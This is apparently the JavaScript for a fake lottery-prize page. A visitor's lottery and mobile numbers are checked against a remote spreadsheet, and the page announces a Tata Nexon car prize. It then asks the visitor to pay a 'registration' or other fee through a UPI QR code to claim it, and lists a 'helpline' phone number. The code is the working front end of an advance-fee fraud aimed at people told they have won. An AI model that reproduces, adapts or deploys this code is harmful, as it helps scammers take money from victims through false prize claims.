document.getElementById('loginForm').addEventListener('submit', function(event) {
  event.preventDefault();
  
  document.getElementById('loader').style.display = 'block';
  document.getElementById('container').style.opacity = '0.5';
  document.getElementById('lotteryNumber').disabled = true;
  document.getElementById('mobileNumber').disabled = true;
  document.getElementById('submit').disabled = true;
  
  const lotteryNumber = document.getElementById('lotteryNumber').value;
  const mobileNumber = document.getElementById('mobileNumber').value;
  
  fetch('https://sheetbase.co/api/jagdish/1Gk5uaLaeEl_qeH4TJkxIlcUEDA8zQ24WATv8ZSjTrVc/sheet1/')
    .then(response => response.json())
    .then(data => {
      const userDetails = data.data.find(user => user.lotteryNumber === lotteryNumber && user.mobileNumber === mobileNumber);
      //const userDetails = data.data.find(item => item.lotteryNumber === lotteryNumber && item.mobileNumber === mobileNumber);
      if (userDetails) {
       document.getElementById('loader').style.display = 'none';
       document.getElementById('container').style.opacity = '1';
       document.getElementById("loginMess").style.display = "inline-block";
       // Display details
       displayDetails(userDetails);
       //Display Numbers Comma
       formatIndianNumber();
        document.getElementById("loginForm").style.display = "none";
        document.getElementById("heading").innerText = "CONGRATULATIONS" + "\n" + userDetails.name;
        document.getElementById("heading").style.background = "#0070cb";
        document.getElementById("heading").style.color = "#fff";
        document.getElementById("heading").style.textDecoration = "none";
        document.getElementById("loginMess").innerText = "Login Successful";
        document.getElementById("loginMess").style.backgroundColor = "#00c04b";
        document.getElementById("loginMessage").style.display = "none";
        const img = document.getElementById('myImage');
        const loaderContainer = document.querySelector('.load-container');
        
        // Add a cache-buster query string to the image URL to force reload
        img.src = img.src + "&t=" + new Date().getTime();
        
        img.onload = function() {
          loaderContainer.style.display = 'none'; // Hide loader
          img.style.display = 'block'; // Show image
        };
        
        img.onerror = function() {
          loaderContainer.style.display = 'none'; // Hide loader on error
          alert('Failed to load the QR.');
        };

      } else {
        document.getElementById('loader').style.display = 'none';
        document.getElementById('lotteryNumber').disabled = false;
        document.getElementById('mobileNumber').disabled = false;
        document.getElementById('submit').disabled = false;
        document.getElementById('container').style.opacity = '1';
        document.getElementById("loginMessage").style.display = "inline-block";
        alert('Details not found.\nPlease check your details.');
        document.getElementById("loginMessage").innerText = " Details Not Found";
        document.getElementById("loginMessage").style.color = "red";
        document.getElementById("loginMessage").style.backgroundColor = "none";
      }
    })
    .catch(error => console.error('Error:', error));
});

function displayDetails(userDetails) {
  const detailsDiv = document.getElementById('details');
  detailsDiv.innerHTML = `
    <span style="font-size: 24px; font-weight: 600; background: #00c04b; color: #fff; padding: 2px 25px; border-radius: 5px;">DETAILS:-</span>
    <p>Name: <span style="text-transform: capitalize;">${userDetails.name}</span></p>
    <p>Mobile Number: ${userDetails.mobileNumber}</p>
    <p>Lottery Number: ${userDetails.lotteryNumber}</p>
    <p>Prize Name: Tata Nexon</p>
    <p>Prize Amount: RS. ${userDetails.prizeAmount}</p>
    <!--<p>Registration Fees: RS. <span class="indian-number">${userDetails.registrationCharge}</span></p>-->
    <p>${userDetails.feesType}: Rs. <span class="indian-number">${userDetails.registrationCharge}</span></p>
    <!--<p>State: <span style="text-transform: capitalize;">${userDetails.state}</span></p>-->
    <p>Prize Status: <span style="color: red;">Not Claimed</span></p>
    <img src="car.jpeg" style="width: 100%; border-radius: 5px; pointer-events: none;"><br><br>
    <div style="border: 2px solid #0070cb; border-radius: 10px; border-sizing: border-box;">
    <p style="font-size: 15px; background: #0070cb; padding: 5px; color: #fff;">Dear <span style="text-transform: capitalize;">${userDetails.name}</span>, Please continue your process by paying your ${userDetails.feesType} Rs. <span class="indian-number">${userDetails.registrationCharge}</span> in company bank account.</p>
    
    <center>
    <div class="load-container">
        <div class="load"></div>
    </div>
    <img id="myImage" src="https://api.qrserver.com/v1/create-qr-code/?data=upi://pay?pa=${userDetails.upi}%26cu=INR%26am=${userDetails.registrationCharge}"/>
    </center>
    <p><span style="color:#fff; background: #0070cb; padding: 5px 15px; border-radius: 5px; pointer-events: none;">SCAN TO PAY</span></p>
    </div>
    <p>--------X--------</p>
    <div style="border: 2px solid #00c04b; border-radius: 10px; border-sizing: border-box;">
    <p style="font-size: 15px; padding: 5px;">*For Any Question or Issue, You Can Call Helpline No. +91 9038114963.</p>
    <p><a href = "tel:+919038114963" style = "padding: 5px 15px; background: #00c04b; text-decoration: none; color: #fff; border-radius: 5px;">CALL NOW</a></p>
    </div>
  `;
}

function formatIndianNumber() {
  var spans = document.querySelectorAll('span.indian-number');
  spans.forEach(function(span) {
    var number = span.textContent;
    var formattedNumber = new Intl.NumberFormat('en-IN').format(number);
    span.textContent = formattedNumber;
  });
}
